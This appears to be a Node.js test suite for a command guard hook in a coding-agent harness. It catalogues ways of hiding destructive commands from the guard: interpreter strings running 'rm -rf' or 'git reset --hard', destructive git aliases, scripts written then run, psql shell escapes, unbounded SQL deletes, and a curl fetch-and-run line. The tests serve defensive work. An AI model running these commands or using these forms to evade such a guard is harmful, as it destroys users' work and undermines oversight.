'use strict';

// Story 29-04: the forms 29-03's reviews found hiding a destructive command in
// something the guard did not read — interpreter strings, a git alias set for a
// later call, a script file written then run, SQL beyond DROP DATABASE, a
// removal of a modified tracked file — and the table of what it still does not
// read. Same claim as 29-03: a form the guard can read but not prove is
// unchecked (logged; strict refuses it); what is clearly destructive is refused.

const { test } = require('node:test');
const assert = require('node:assert');
const { execFileSync, spawnSync } = require('node:child_process');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const { decide } = require('../bin/lib/guard');

const ROOT = path.join(__dirname, '..');

function git(dir, ...args) {
  return execFileSync('git', ['-C', dir, ...args], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
}

function tmp(t, base = os.tmpdir()) {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(base, 'coding-flow-evasion-')));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  return dir;
}

// One commit; `a.txt` modified in the work tree, `b.txt` clean, `build/` untracked.
function repo(t, harness = null) {
  const dir = tmp(t);
  git(dir, 'init', '-q', '-b', 'main');
  fs.mkdirSync(path.join(dir, '.coding-flow'));
  fs.mkdirSync(path.join(dir, 'build'));
  fs.writeFileSync(path.join(dir, 'a.txt'), 'one\n');
  fs.writeFileSync(path.join(dir, 'b.txt'), 'one\n');
  fs.writeFileSync(path.join(dir, 'build', 'out.js'), 'x\n');
  git(dir, 'add', 'a.txt', 'b.txt');
  git(dir, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-qm', 'init');
  fs.writeFileSync(path.join(dir, 'a.txt'), 'two\n');
  if (harness) {
    fs.writeFileSync(path.join(dir, '.coding-flow', 'harness.json'), JSON.stringify(harness));
  }
  return dir;
}

const run = (dir, command, cwd = dir) => decide({ tool_name: 'Bash', cwd, tool_input: { command } }, dir);

function expectAll(dir, decision, commands, cwd = dir) {
  for (const command of commands) {
    const result = run(dir, command, cwd);
    assert.equal(result.decision, decision, `${command}: ${result.reason}`);
  }
}

// --- criterion 1: the string literals of interpreter code are read ------------------

test('interpreter code: a string literal read as a destructive command makes the call unchecked', (t) => {
  const dir = repo(t);
  expectAll(dir, 'unchecked', [
    `python3 -c 'import os; os.system("rm -rf build")'`,
    `python -c "import subprocess; subprocess.run('git reset --hard', shell=True)"`,
    `node -e 'require("child_process").execSync("git clean -fdx")'`,
    `node --eval='require("child_process").execSync("rm -rf build")'`,
    `perl -e 'system("git push --force origin main")'`,
    `ruby -e 'system("rm -rf build")'`,
    `php -r 'shell_exec("rm -rf build");'`,
  ]);
  expectAll(dir, 'allow', [
    `python3 -c 'print(1)'`,
    `python3 -c 'import sys; print(sys.version)'`,
    `node -e 'console.log(require("./package.json").version)'`,
    `perl -e 'print "rm is a command\\n"'`,
  ]);
});

// The CLI, as the hook runs it: strict turns an unchecked call into a refusal there.
function guardCli(dir, command) {
  const input = JSON.stringify({ tool_name: 'Bash', cwd: dir, tool_input: { command } });
  return spawnSync(process.execPath, [path.join(ROOT, 'bin', 'ai-flow.js'), 'guard'], { cwd: dir, input, encoding: 'utf8' });
}

test('interpreter code: strict mode refuses what standard leaves unchecked', (t) => {
  const strict = repo(t, { mode: 'strict' });
  assert.equal(guardCli(strict, `python3 -c 'import os; os.system("rm -rf build")'`).status, 2);
  assert.equal(guardCli(strict, `python3 -c 'print(1)'`).status, 0);
  const standard = repo(t);
  assert.equal(guardCli(standard, `python3 -c 'import os; os.system("rm -rf build")'`).status, 0);
});

// --- criterion 2: a path built from pieces ---------------------------------------------

test('interpreter code: the policy file built from pieces is unchecked', (t) => {
  const dir = repo(t);
  const inside = path.join(dir, '.coding-flow');
  expectAll(dir, 'unchecked', [
    `python3 -c 'import os; os.remove("harness" ".json")'`,
    `python3 -c 'import os; os.remove("harness" + ".json")'`,
    `node -e 'require("fs").unlinkSync("har" + "ness.json")'`,
  ], inside);
  expectAll(dir, 'unchecked', [
    `python3 -c 'import os; os.remove(".coding" + "-flow/harness.json")'`,
    `python3 -c 'import os; os.system("rm" + " -rf build")'`,
  ]);
  // Pieces that name neither the policy file nor a destructive command.
  expectAll(dir, 'allow', [`python3 -c 'print("a" + "b")'`], inside);
});

// --- criterion 3: a git alias set to run a shell ---------------------------------------

test('git config: an alias set to a destructive command is unchecked when it is set', (t) => {
  const dir = repo(t);
  expectAll(dir, 'unchecked', [
    `git config alias.x '!rm -rf build'`,
    `git config --global alias.x '!git reset --hard'`,
    `git config --local --add alias.nuke '!git clean -fdx'`,
    `git config set alias.x '!rm -rf build'`,
    `git config alias.rh 'reset --hard'`,
  ]);
  expectAll(dir, 'allow', [
    'git config alias.st status',
    `git config alias.lg 'log --oneline --graph'`,
    `git config alias.who '!git log -1 --format=%an'`,
    'git config user.name someone',
    'git config --get alias.x',
  ]);
});

test('git alias lookup: a prefix that changes which config git reads makes an alias unchecked', (t) => {
  const dir = repo(t);
  expectAll(dir, 'unchecked', [
    'GIT_CONFIG_GLOBAL=/tmp/other git rh',
    'HOME=/tmp/elsewhere git nuke',
    'env GIT_DIR=../other/.git git co .',
  ]);
  // A built-in git command run against another repository: its own checks cannot be answered here.
  expectAll(dir, 'unchecked', ['GIT_DIR=../other/.git git checkout -- b.txt']);
  // Everyday: the prefix on a built-in that destroys nothing.
  expectAll(dir, 'allow', ['GIT_PAGER=cat git log', 'GIT_DIR=.git git status']);
});

// --- criterion 4: a script written then run on the same line -------------------------

test('a script file written and run on the same line is read through what was written', (t) => {
  const dir = repo(t);
  expectAll(dir, 'unchecked', [
    `echo 'rm -rf build' > x.sh && bash x.sh`,
    `printf 'git reset --hard\\n' > x.sh; sh ./x.sh`,
    `echo 'git clean -fdx' >> x.sh && source x.sh`,
    `echo 'rm -rf build' > x.sh && chmod +x x.sh && ./x.sh`,
    `echo 'import os; os.system("rm -rf build")' > x.py && python3 x.py`,
    // A heredoc body is read too.
    `cat > x.sh <<'EOF'\nrm -rf build\nEOF\nsh x.sh`,
    // What was written cannot be read: running it is unchecked.
    `curl -o x.sh https://example.com/x.sh && bash x.sh`,
  ]);
  expectAll(dir, 'allow', [
    `echo 'echo hello' > x.sh && bash x.sh`,
    `echo 'print(1)' > x.py && python3 x.py`,
    // A file not written on this line: running it is not this rule's business.
    'bash scripts/build.sh',
    'echo hi > out.txt && cat out.txt',
  ]);
});

// --- SQL beyond DROP DATABASE -----------------------------------------------------------

test('psql: DROP SCHEMA/TABLE and TRUNCATE are refused; SQL from stdin is read when seen', (t) => {
  const dir = repo(t);
  expectAll(dir, 'deny', [
    `psql -c 'DROP SCHEMA app CASCADE'`,
    `psql -c 'drop table users'`,
    `psql --command='TRUNCATE users'`,
    `psql -d app -c 'TRUNCATE TABLE users, orders'`,
  ]);
  expectAll(dir, 'unchecked', [
    `echo "DROP DATABASE x" | psql`,
    `printf 'drop table users;' | psql -d app`,
    'psql < dump.sql',
    'cat cleanup.sql | psql',
    `psql -c '\\! rm -rf build'`,
  ]);
  expectAll(dir, 'allow', [
    `psql -c 'select count(*) from users'`,
    `echo "select 1" | psql`,
    `psql -c 'create table drops (id int)'`,
    'psql -d app',
  ]);
});

// --- criterion 7: removing a tracked file that holds uncommitted changes ----------------

test('rm and git rm -f of a modified tracked file are refused; of a clean file allowed', (t) => {
  const dir = repo(t);
  expectAll(dir, 'deny', ['rm a.txt', 'rm -f a.txt', 'git rm -f a.txt', 'git rm --force a.txt', 'unlink a.txt']);
  expectAll(dir, 'allow', ['rm b.txt', 'git rm -f b.txt', 'git rm --cached a.txt', 'git rm b.txt', 'trash a.txt', 'rm build/out.js']);
  const reason = run(dir, 'rm a.txt').reason;
  assert.match(reason, /a\.txt/);
  assert.match(reason, /git stash push/);
});

test('rm of a modified tracked file from a subdirectory is refused', (t) => {
  const dir = repo(t);
  fs.mkdirSync(path.join(dir, 'src'));
  fs.writeFileSync(path.join(dir, 'src', 'c.txt'), 'one\n');
  git(dir, 'add', 'src/c.txt');
  git(dir, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-qm', 'c');
  fs.writeFileSync(path.join(dir, 'src', 'c.txt'), 'two\n');
  expectAll(dir, 'deny', ['rm c.txt'], path.join(dir, 'src'));
  expectAll(dir, 'deny', ['cd src && rm c.txt']);
});

// --- review round 1 ------------------------------------------------------------------

test('round 1: a script written by a heredoc is read, so an everyday one is allowed', (t) => {
  const dir = repo(t);
  fs.mkdirSync(path.join(dir, 'scripts'));
  fs.writeFileSync(path.join(dir, 'scripts', 'ci.sh'), 'npm ci\nnpm test\n');
  fs.writeFileSync(path.join(dir, 'scripts', 'nuke.sh'), 'git reset --hard\n');
  expectAll(dir, 'allow', [
    "cat > run.sh <<'EOF'\nset -e\nnpm ci\nnpm test\nEOF\nbash run.sh",
    "cat <<EOF > t.py\nprint('hi')\nEOF\npython3 t.py",
    "tee run.sh <<'EOF'\nnpm test\nEOF\nsh run.sh",
    "cat <<-EOF > run.sh\n\tnpm test\n\tEOF\nbash run.sh",
    'cp scripts/ci.sh /tmp/ci-copy.sh && bash /tmp/ci-copy.sh',
  ]);
  expectAll(dir, 'unchecked', [
    "tee run.sh <<'EOF'\ngit reset --hard\nEOF\nsh run.sh",
    "cat <<EOF > t.py\nimport os; os.system('rm -rf build')\nEOF\npython3 t.py",
    // An unquoted body that expands, or `cat` of a file: not read.
    'cat > run.sh <<EOF\n$CMD\nEOF\nbash run.sh',
    'cat part.sh > run.sh <<EOF\nnpm test\nEOF\nbash run.sh',
    'cp scripts/nuke.sh /tmp/n.sh && bash /tmp/n.sh',
    'cp scripts/missing.sh /tmp/m.sh && bash /tmp/m.sh',
    "echo 'rm -rf build' >| x.sh && bash x.sh",
  ]);
});

test('round 1: an interpreter flag glued to its code is read', (t) => {
  const dir = repo(t);
  expectAll(dir, 'unchecked', [
    `python3 -c"import os; os.system('rm -rf build')"`,
    `python3 -c'import os; os.system("rm -rf build")'`,
    `python3 -Bc'import os; os.system("rm -rf build")'`,
    `perl -e'system("rm -rf build")'`,
    `ruby -e'system("rm -rf build")'`,
    `php -r'shell_exec("rm -rf build");'`,
  ]);
  expectAll(dir, 'allow', [`python3 -c'print(1)'`, `perl -Mstrict -e'print 1'`]);
});

test('round 1: escapes, long literals and argument lists in interpreter code are read', (t) => {
  const dir = repo(t);
  const padding = 'x'.repeat(300);
  expectAll(dir, 'unchecked', [
    `python3 -c 'import os; os.system("echo hi\\nrm -rf build")'`,
    `python3 -c 'import os; os.system("rm\\x20-rf build")'`,
    `python3 -c 'import os; os.system("rm -rf build # ${padding}")'`,
    `node -e 'require("child_process").spawnSync("rm", ["-rf", "build"])'`,
    `node -e "require('child_process').execFileSync('git', ['reset', '--hard'])"`,
    `python3 -c 'import subprocess; subprocess.run(["git", "clean", "-fdx"])'`,
    // rm of the modified a.txt inside code that runs here.
    `python3 -c 'import os; os.system("rm a.txt")'`,
    `echo 'rm a.txt' > x.sh && bash x.sh`,
    `git config alias.drop '!rm a.txt'`,
  ]);
  expectAll(dir, 'allow', [
    `node -e 'require("child_process").spawnSync("ls", ["-la"])'`,
    `python3 -c 'import os; os.system("rm b.txt")'`,
  ]);
});

test('round 1: more SQL is read: comments, DELETE without WHERE, DROP OWNED/COLUMN, -f files', (t) => {
  const dir = repo(t);
  fs.writeFileSync(path.join(dir, 'seed.sql'), 'insert into users values (1);\n');
  fs.writeFileSync(path.join(dir, 'wipe.sql'), 'delete from users;\n');
  expectAll(dir, 'deny', [
    `psql -c 'DROP/**/TABLE users'`,
    `psql -c 'delete from users'`,
    `psql -c 'DELETE FROM users;'`,
    `psql -c 'DROP OWNED BY app'`,
    `psql -c 'alter table users drop column email'`,
    `psql -c 'drop -- note\n table users'`,
  ]);
  expectAll(dir, 'unchecked', [
    'psql -f wipe.sql',
    'psql -fwipe.sql',
    'psql --file=missing.sql',
    'psql < wipe.sql',
    "psql <<'SQL'\ndrop table users;\nSQL",
  ]);
  expectAll(dir, 'allow', [
    `psql -c 'delete from users where id = 1'`,
    'psql -f seed.sql',
    'psql < seed.sql',
    "psql <<'SQL'\nselect 1;\nSQL",
  ]);
});

test('round 1: rm of a file whose change is all staged is allowed; a harmless env prefix leaves aliases read', (t) => {
  const dir = repo(t);
  git(dir, 'add', 'a.txt');
  expectAll(dir, 'allow', ['rm a.txt', 'rm missing.txt']);
  expectAll(dir, 'deny', ['git rm -f a.txt']);
  expectAll(dir, 'allow', ['GIT_CONFIG_NOSYSTEM=1 git lg', 'GIT_PAGER=cat git lg']);
  expectAll(dir, 'unchecked', ['GIT_CONFIG_GLOBAL=/tmp/x git lg']);
});

test('round 1: rm reads the index to skip git status, and still refuses through a split index or a fresh edit', (t) => {
  const dir = repo(t);
  // Same size as the committed text, written just now: the index cannot vouch for it.
  fs.writeFileSync(path.join(dir, 'b.txt'), 'two\n');
  expectAll(dir, 'deny', ['rm b.txt']);
  git(dir, 'checkout', '--', 'b.txt');
  expectAll(dir, 'allow', ['rm b.txt', 'rm build/out.js']);
  git(dir, 'update-index', '--split-index');
  expectAll(dir, 'deny', ['rm a.txt']);
  // A linked worktree: `.git` is a file pointing at the index.
  const linked = path.join(tmp(t), 'wt');
  git(dir, 'worktree', 'add', '-q', linked);
  fs.writeFileSync(path.join(linked, 'a.txt'), 'three\n');
  expectAll(linked, 'deny', ['rm a.txt']);
  expectAll(linked, 'allow', ['rm b.txt']);
});

// --- review round 2 ------------------------------------------------------------------

// Hostile input, 10 KB each: a reader that backtracks would hold the hook past its
// 60 s timeout, and the call would then run unchecked. Each is read by this story's
// reader (destructive.js; the frozen 29-03 reader is 29-03's) in a child process (a
// regex cannot be interrupted in-process) killed after 20 s; the bound is 1 s, far
// under the hook timeout and loose enough for a loaded machine.
const HOSTILE = (n) => ({
  'list items, unclosed': `node -e 'x = [${'"a"  '.repeat(n / 5)}'`,
  'list items, closed': `node -e 'x = [${'"a", '.repeat(n / 5)}"b"]'`,
  'quote then spaces': `node -e '"${' '.repeat(n)}x'`,
  'quote plus quote': `node -e '${'"a" + '.repeat(n / 6)}'`,
  'escapes': `python3 -c '"${'\\x'.repeat(n / 2)}'`,
  'unclosed quotes': `node -e '${'"a'.repeat(n / 2)}'`,
  'sql comments': `psql -c "${'/*'.repeat(n / 2)}"`,
  'sql quotes': `psql -c "${"'a".repeat(n / 2)}"`,
  'sql dollars': `psql -c "${'$a$'.repeat(n / 3)}"`,
  'sql delete': `psql -c "delete from ${'a '.repeat(n / 2)}"`,
  'psql meta': `psql <<'EOF'\n${'\\! echo\n'.repeat(n / 9)}EOF`,
  'heredoc script': `cat > x.sh <<'EOF'\n${'echo hi\n'.repeat(n / 8)}EOF\nbash x.sh`,
  'echo script': `echo '${'echo hi; '.repeat(n / 9)}' > x.sh && bash x.sh`,
  'alias value': `git config alias.x '!${'echo hi; '.repeat(n / 9)}'`,
  'redirects': `echo hi ${'> a '.repeat(n / 4)}`,
  'glued flag': `python3 -c${'"'.repeat(n)}`,
  'psql backslashes': `psql -c "\\${'"a'.repeat(n / 2)}`,
});

test('round 2: every reader of this story stays linear on 10 KB of hostile input', (t) => {
  const dir = repo(t);
  const script = [
    `const { readDestructive } = require(${JSON.stringify(path.join(ROOT, 'bin', 'lib', 'destructive'))});`,
    'const command = require("fs").readFileSync(0, "utf8");',
    'const t0 = process.hrtime.bigint();',
    `readDestructive(command, { cwd: ${JSON.stringify(dir)}, host: {} });`,
    'process.stdout.write(String(Number(process.hrtime.bigint() - t0) / 1e6));',
  ].join('\n');
  for (const [name, command] of Object.entries(HOSTILE(10000))) {
    const child = spawnSync(process.execPath, ['-e', script], { input: command, encoding: 'utf8', timeout: 20000 });
    assert.equal(child.status, 0, `${name}: did not finish (${child.signal || child.stderr})`);
    assert.ok(Number(child.stdout) < 1000, `${name}: ${child.stdout} ms`);
  }
});

test('round 2: psql flag clusters ending in c or f are read', (t) => {
  const dir = repo(t);
  fs.writeFileSync(path.join(dir, 'drop.sql'), 'drop table users;\n');
  expectAll(dir, 'deny', [
    `psql -tAc 'DROP DATABASE x'`,
    `psql -Atc 'TRUNCATE t'`,
    `psql -qc 'DROP TABLE t'`,
    `psql -qc'DROP TABLE t'`,
  ]);
  expectAll(dir, 'unchecked', ['psql -tAf drop.sql', 'psql -qfdrop.sql']);
  expectAll(dir, 'allow', [`psql -tAc 'select 1'`, 'psql -tA -d app']);
});

test("round 2: psql's \\! and \\i are read wherever psql reads its commands", (t) => {
  const dir = repo(t);
  fs.writeFileSync(path.join(dir, 'shell.sql'), 'select 1;\n\\! rm -rf build\n');
  fs.writeFileSync(path.join(dir, 'ok.sql'), 'select 1;\n\\! echo done\n');
  expectAll(dir, 'unchecked', [
    "psql <<'EOF'\n\\! rm -rf build\nEOF",
    'psql -f shell.sql',
    'psql < shell.sql',
    `echo '\\! rm -rf build' | psql`,
    `psql -c '\\i other.sql'`,
    `psql -c "\\i other.sql"`,
    `psql -c "\\! rm -rf build"`,
    "psql <<'EOF'\n\\ir more.sql\nEOF",
  ]);
  expectAll(dir, 'allow', ['psql -f ok.sql', "psql <<'EOF'\nselect 1;\nEOF"]);
});

test('round 2: DELETE with no WHERE whatever follows the table; SQL inside a string is text', (t) => {
  const dir = repo(t);
  expectAll(dir, 'deny', [
    `psql -c 'delete from t u'`,
    `psql -c 'DELETE FROM t AS u'`,
    `psql -c 'delete from t returning *'`,
    `psql -c 'delete from t using x'`,
    `psql -c 'select 1; delete from t'`,
  ]);
  expectAll(dir, 'allow', [
    `psql -c "SELECT 'drop table x'"`,
    `psql -c "insert into notes values ('truncate the log')"`,
    `psql -c 'select $$drop table x$$'`,
    `psql -c 'delete from t u using x where u.id = x.id'`,
  ]);
});

test('round 2: a group redirected into a file, then run, is not read as clean', (t) => {
  const dir = repo(t);
  expectAll(dir, 'unchecked', [
    `(echo 'rm -rf build') > x.sh && bash x.sh`,
    `{ echo 'rm -rf build'; } > x.sh && bash x.sh`,
  ]);
});

// --- review round 3 ------------------------------------------------------------------

// Monotonic: a scanner may only add refusals. Every SQL and interpreter case of this
// file, plus the forms round 3 found, with the decision 3c90919 (29-03, before this
// story) recorded for it on the fixture below. HEAD must be at least as strict:
// deny > unchecked > allow.
const AT_29_03 = [
  ["psql -c 'select 1 as \"a--b\"; DROP DATABASE prod'", "deny"],
  ["psql -c 'select \"/*\"; DROP DATABASE prod; select \"*/\"'", "deny"],
  ["psql -c 'select 1 as x$a$; DROP DATABASE prod; select 1 as y$a$'", "deny"],
  ["psql -c \"select E'\\\\'' ; DROP DATABASE prod; select 'x'\"", "deny"],
  ["psql -c 'select \"/*\"; DROP TABLE prod; select \"*/\"'", "allow"],
  ["psql -c 'select 1 as x$a$; TRUNCATE prod; select 1 as y$a$'", "allow"],
  ["psql -c \"SELECT 'drop database x'\"", "deny"],
  ["psql -c 'DROP DATABASE x'", "deny"],
  ["psql --command='DROP DATABASE x'", "deny"],
  ["psql -cDROP\\ DATABASE\\ x", "allow"],
  ["psql -c 'DROP SCHEMA app CASCADE'", "allow"],
  ["psql -c 'drop table users'", "allow"],
  ["psql --command='TRUNCATE users'", "allow"],
  ["psql -d app -c 'TRUNCATE TABLE users, orders'", "allow"],
  ["echo \"DROP DATABASE x\" | psql", "allow"],
  ["printf 'drop table users;' | psql -d app", "allow"],
  ["psql < dump.sql", "allow"],
  ["cat cleanup.sql | psql", "allow"],
  ["psql -c '\\! rm -rf build'", "unchecked"],
  ["psql -c 'select count(*) from users'", "allow"],
  ["echo \"select 1\" | psql", "allow"],
  ["psql -c 'create table drops (id int)'", "allow"],
  ["psql -d app", "allow"],
  ["psql -c 'DROP/**/TABLE users'", "allow"],
  ["psql -c 'delete from users'", "allow"],
  ["psql -c 'DELETE FROM users;'", "allow"],
  ["psql -c 'DROP OWNED BY app'", "allow"],
  ["psql -c 'alter table users drop column email'", "allow"],
  ["psql -c 'drop -- note\n table users'", "allow"],
  ["psql -f wipe.sql", "allow"],
  ["psql -fwipe.sql", "allow"],
  ["psql --file=missing.sql", "allow"],
  ["psql < wipe.sql", "allow"],
  ["psql <<'SQL'\ndrop table users;\nSQL", "allow"],
  ["psql -c 'delete from users where id = 1'", "allow"],
  ["psql -f seed.sql", "allow"],
  ["psql < seed.sql", "allow"],
  ["psql <<'SQL'\nselect 1;\nSQL", "allow"],
  ["psql -tAc 'DROP DATABASE x'", "allow"],
  ["psql -Atc 'TRUNCATE t'", "allow"],
  ["psql -qc 'DROP TABLE t'", "allow"],
  ["psql -qc'DROP TABLE t'", "allow"],
  ["psql -tAf drop.sql", "allow"],
  ["psql -qfdrop.sql", "allow"],
  ["psql -tAc 'select 1'", "allow"],
  ["psql -tA -d app", "allow"],
  ["psql <<'EOF'\n\\! rm -rf build\nEOF", "allow"],
  ["psql -f shell.sql", "allow"],
  ["psql < shell.sql", "allow"],
  ["echo '\\! rm -rf build' | psql", "allow"],
  ["psql -c '\\i other.sql'", "allow"],
  ["psql -c \"\\i other.sql\"", "allow"],
  ["psql -c \"\\! rm -rf build\"", "unchecked"],
  ["psql <<'EOF'\n\\ir more.sql\nEOF", "allow"],
  ["psql -f ok.sql", "allow"],
  ["psql -c 'delete from t u'", "allow"],
  ["psql -c 'DELETE FROM t AS u'", "allow"],
  ["psql -c 'delete from t returning *'", "allow"],
  ["psql -c 'delete from t using x'", "allow"],
  ["psql -c 'select 1; delete from t'", "allow"],
  ["psql -c \"SELECT 'drop table x'\"", "allow"],
  ["psql -c \"insert into notes values ('truncate the log')\"", "allow"],
  ["psql -c 'select $$drop table x$$'", "allow"],
  ["psql -c 'delete from t u using x where u.id = x.id'", "allow"],
  ["psql -c 'alter table t drop c'", "allow"],
  ["psql -tAHc 'drop table t'", "allow"],
  ["<drop.sql psql app", "allow"],
  ["psql app 0< drop.sql", "allow"],
  ["python3 -c 'import os; os.system(\"rm -rf build\")'", "allow"],
  ["python -c \"import subprocess; subprocess.run('git reset --hard', shell=True)\"", "allow"],
  ["node -e 'require(\"child_process\").execSync(\"git clean -fdx\")'", "allow"],
  ["node --eval='require(\"child_process\").execSync(\"rm -rf build\")'", "allow"],
  ["perl -e 'system(\"git push --force origin main\")'", "allow"],
  ["ruby -e 'system(\"rm -rf build\")'", "allow"],
  ["php -r 'shell_exec(\"rm -rf build\");'", "allow"],
  ["python3 -c 'print(1)'", "allow"],
  ["python3 -c 'import sys; print(sys.version)'", "allow"],
  ["node -e 'console.log(require(\"./package.json\").version)'", "allow"],
  ["perl -e 'print \"rm is a command\\n\"'", "allow"],
  ["python3 -c 'import os; os.remove(\"harness\" + \".json\")'", "allow"],
  ["python3 -c 'import os; os.remove(\".coding\" + \"-flow/harness.json\")'", "unchecked"],
  ["python3 -c 'import os; os.system(\"rm\" + \" -rf build\")'", "allow"],
  ["python3 -c 'print(\"a\" + \"b\")'", "allow"],
  ["python3 -c\"import os; os.system('rm -rf build')\"", "allow"],
  ["python3 -c'import os; os.system(\"rm -rf build\")'", "allow"],
  ["python3 -Bc'import os; os.system(\"rm -rf build\")'", "allow"],
  ["perl -e'system(\"rm -rf build\")'", "allow"],
  ["ruby -e'system(\"rm -rf build\")'", "allow"],
  ["php -r'shell_exec(\"rm -rf build\");'", "allow"],
  ["python3 -c'print(1)'", "allow"],
  ["perl -Mstrict -e'print 1'", "allow"],
  ["python3 -c 'import os; os.system(\"echo hi\\nrm -rf build\")'", "allow"],
  ["python3 -c 'import os; os.system(\"rm\\x20-rf build\")'", "allow"],
  ["node -e 'require(\"child_process\").spawnSync(\"rm\", [\"-rf\", \"build\"])'", "allow"],
  ["node -e \"require('child_process').execFileSync('git', ['reset', '--hard'])\"", "allow"],
  ["python3 -c 'import subprocess; subprocess.run([\"git\", \"clean\", \"-fdx\"])'", "allow"],
  ["python3 -c 'import os; os.system(\"rm a.txt\")'", "allow"],
  ["node -e 'require(\"child_process\").spawnSync(\"ls\", [\"-la\"])'", "allow"],
  ["python3 -c 'import os; os.system(\"rm b.txt\")'", "allow"],
  ["python3 -c \"# don't\nimport os; os.system('rm -rf build')\"", "allow"],
  ["node -e '// it\"s\nrequire(\"child_process\").execSync(\"git reset --hard\")'", "allow"],
  ["echo 'import os; os.system(\"rm -rf build\")' > x.py && python3 x.py", "allow"],
  ["echo 'print(1)' > x.py && python3 x.py", "allow"],
  ["cat <<EOF > t.py\nprint('hi')\nEOF\npython3 t.py", "allow"],
  ["cat <<EOF > t.py\nimport os; os.system('rm -rf build')\nEOF\npython3 t.py", "allow"],
];

function corpusRepo(t) {
  const dir = repo(t);
  const files = {
    'seed.sql': 'insert into users values (1);\n',
    'wipe.sql': 'delete from users;\n',
    'drop.sql': 'drop table users;\n',
    'shell.sql': 'select 1;\n\\! rm -rf build\n',
    'ok.sql': 'select 1;\n\\! echo done\n',
  };
  for (const [file, text] of Object.entries(files)) {
    fs.writeFileSync(path.join(dir, file), text);
  }
  return dir;
}

test('round 3: no SQL or interpreter case is decided less strictly than 29-03 decided it', (t) => {
  const dir = corpusRepo(t);
  const rank = { allow: 0, unchecked: 1, deny: 2 };
  for (const [command, before] of AT_29_03) {
    const now = run(dir, command).decision;
    assert.ok(rank[now] >= rank[before], `${command}: ${now}, 29-03 said ${before}`);
  }
  // The four forms round 2's scanner let through: refused, as at 29-03.
  for (const [command] of AT_29_03.slice(0, 4)) {
    assert.equal(run(dir, command).decision, 'deny', command);
  }
});

test('round 3: the SQL scanner keeps identifiers opaque, dollar quotes where they can start, E-string escapes', (t) => {
  const dir = corpusRepo(t);
  expectAll(dir, 'deny', [
    `psql -c 'select "/*"; DROP TABLE prod; select "*/"'`,
    `psql -c 'select 1 as x$a$; TRUNCATE prod; select 1 as y$a$'`,
    `psql -c 'select 1 as "a--b"; drop schema app'`,
    `psql -c "select E'\\\\\\\\', 'x'; drop table t"`,
    `psql -c 'alter table t drop c'`,
    `psql -tAHc 'drop table t'`,
  ]);
  expectAll(dir, 'allow', [
    `psql -c 'select $$drop table x$$'`,
    `psql -c 'alter table t drop constraint k'`,
    `psql -c 'select "drop table"'`,
  ]);
  // Accepted noise, kept from 29-03: DROP DATABASE is matched on the raw text.
  expectAll(dir, 'deny', [`psql -c "SELECT 'drop database x'"`]);
});

test('round 3: a redirection before the command is read past', (t) => {
  const dir = corpusRepo(t);
  expectAll(dir, 'unchecked', ['<drop.sql psql app', 'psql app 0< drop.sql', '0<drop.sql psql']);
  expectAll(dir, 'allow', ['<seed.sql psql app']);
  expectAll(dir, 'deny', ['>out.txt git reset --hard', '2>/dev/null git reset --hard']);
});

test('round 3: a comment that throws off the quote pairing does not hide a destructive verb', (t) => {
  const dir = corpusRepo(t);
  expectAll(dir, 'unchecked', [
    `python3 -c "# don't\nimport os; os.system('rm -rf build')"`,
    `node -e '// it"s\nrequire("child_process").execSync("git reset --hard")'`,
  ]);
  expectAll(dir, 'allow', [`python3 -c "# don't\nprint(1)"`]);
});

test('round 3, re-scoped in round 4: the shell-write guard reads backslashes as 29-03 did', (t) => {
  const dir = corpusRepo(t);
  // `"\.env"` names a file called `\.env` for bash; the shell-write guard reads it as
  // `.env`, as 29-03 shipped it, and refuses it (accepted noise, plan.md R4). Only the
  // destructive reader keeps bash's backslashes (`psql -c "\! rm -rf build"`).
  expectAll(dir, 'deny', [`echo x > "\\.env"`, 'echo x > .env', `echo x > ".env"`]);
  expectAll(dir, 'unchecked', [`psql -c "\\! rm -rf build"`]);
});

// --- review round 4: the strictest of two readers ----------------------------------

// The reviewers' repository: aliases in .git/config (nuke = reset --hard, zap = !rm -rf
// build, st = status), a.txt and src/m.js modified, c.txt staged.
function reviewerRepo(t, base) {
  const dir = tmp(t, base);
  git(dir, 'init', '-q', '-b', 'main');
  fs.mkdirSync(path.join(dir, '.coding-flow'));
  fs.mkdirSync(path.join(dir, 'build'));
  fs.mkdirSync(path.join(dir, 'src'));
  const write = (file, text) => fs.writeFileSync(path.join(dir, file), text);
  write('a.txt', 'one\n'); write('b.txt', 'one\n'); write('c.txt', 'one\n'); write('src/m.js', 'x\n'); write('build/out.js', 'x\n');
  write('seed.sql', 'insert into users values (1);\n'); write('wipe.sql', 'delete from users;\n'); write('drop.sql', 'drop table users;\n');
  write('shell.sql', 'select 1;\n\\! rm -rf build\n'); write('ok.sql', 'select 1;\n');
  write('run.sh', 'echo hi\n'); write('evil.sh', 'rm -rf build\n');
  git(dir, 'add', '.');
  git(dir, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-qm', 'init');
  git(dir, 'config', 'alias.nuke', 'reset --hard');
  git(dir, 'config', 'alias.zap', '!rm -rf build');
  git(dir, 'config', 'alias.st', 'status');
  write('a.txt', 'two\n'); write('src/m.js', 'y\n'); write('c.txt', 'two\n');
  git(dir, 'add', 'c.txt');
  return dir;
}

test("round 4: on the reviewers' corpus, no command is decided less strictly than 29-03 decided it", (t) => {
  const { cases } = JSON.parse(fs.readFileSync(path.join(__dirname, 'fixtures', 'guard-29-03-decisions.json'), 'utf8'));
  assert.ok(cases.length > 500, `${cases.length} recorded cases`);
  const dir = reviewerRepo(t);
  const rank = { allow: 0, unchecked: 1, deny: 2 };
  const weaker = cases.filter(([command, before]) => rank[run(dir, command).decision] < rank[before]);
  assert.deepEqual(weaker, []);
});

test('round 4: the two round-4 regressions are refused, as 29-03 refused them', (t) => {
  const dir = reviewerRepo(t);
  expectAll(dir, 'deny', [
    'GIT_WORK_TREE=. git checkout -- a.txt',
    'GIT_DIR=.git GIT_WORK_TREE=. git checkout -- a.txt',
    'sudo GIT_WORK_TREE=. git checkout -- a.txt',
    'GIT_INDEX_FILE=.git/index git restore a.txt',
    'HOME=/tmp/x git nuke',
    'XDG_CONFIG_HOME=/tmp/x git nuke',
    'GIT_CONFIG_GLOBAL=/tmp/x git nuke',
    'cd src && HOME=/tmp/x git nuke',
  ]);
  // A repository alias that destroys nothing stays allowed under a file-level prefix.
